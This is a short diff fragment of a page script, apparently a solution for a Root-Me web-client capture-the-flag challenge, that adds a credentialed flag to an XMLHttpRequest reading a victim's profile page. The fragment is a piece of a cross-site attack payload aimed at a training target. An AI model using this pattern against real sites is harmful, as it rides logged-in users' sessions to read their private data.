@@ -15,6 +15,7 @@
 </form>
     <script>
         var req = new XMLHttpRequest()
+        req.withCredentials = true
         req.open("GET", "http://challenge01.root-me.org/web-client/ch23/?action=profile")
         req.send()
         var resp = req.responseText
